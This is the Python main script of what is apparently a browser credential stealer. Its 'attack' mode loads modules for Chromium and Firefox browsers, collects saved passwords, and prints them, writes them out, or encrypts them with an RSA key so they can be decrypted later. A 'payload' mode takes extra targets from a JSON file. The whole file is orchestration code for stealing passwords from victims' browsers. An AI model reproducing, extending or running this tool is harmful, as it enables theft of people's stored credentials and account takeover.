import argparse

from libs.crypto.hybrid_rsa import genkeys, encrypt, decrypt
from libs.io import string_passwords, write_to_file
from libs.json import parse_json
from libs.modules import run_module
from modules.modules_manager import ModuleManager, firefox_browsers, chromium_browsers


def arg_parser(args):
	json = parse_json(args.input)
	vars(args)['mode'] = vars(args)['input'] = None

	for arg in vars(args):
		if arg in json.keys() and vars(args)[arg] is None:
			vars(args)[arg] = json[arg]

	if 'extra' in json.keys():
		for browser in json['extra']:
			match browser['engine']:
				case 'chromium':
					chromium_browsers.append((browser['name'], browser['data']))
					vars(args)['targets'].append(browser['name'])
				case 'firefox':
					firefox_browsers.append((browser['name'], browser['data']))
					vars(args)['targets'].append(browser['name'])


if __name__ == '__main__':

	parser = argparse.ArgumentParser()
	parser.add_argument("mode", help="select your mode", choices=['attack', 'decrypt', 'payload', 'genkeys'])
	parser.add_argument("-t", "--targets", help="sets the attack targets", nargs='+')
	parser.add_argument("-k", "--key", help="set the key file path")
	parser.add_argument("-i", "--input", help="set the input file path")
	parser.add_argument("-o", "--output", help="sets the output file path")
	args = parser.parse_args()

	if args.mode == 'payload' and args.input:
		arg_parser(args)

	match args.mode:
		case 'attack':
			if args.targets:

				passwords = []
				manager = ModuleManager()
				manager.select_target_modules(args.targets)
				drivers = manager.factory_drivers()

				for driver in drivers:
					run_module(passwords, driver)

				if passwords:
					stringed_passwords = string_passwords(passwords)

					if args.output:

						if args.key:
							encrypt(stringed_passwords, args.output, args.key)

						else:
							write_to_file(stringed_passwords, args.output)

					else:
						print(stringed_passwords)

		case 'decrypt':

			if args.input and args.key:
				decrypted = decrypt(args.input, args.key)

				if args.output:
					write_to_file(decrypted, args.output)
				else:
					print(decrypted)

		case 'genkeys':
			genkeys()
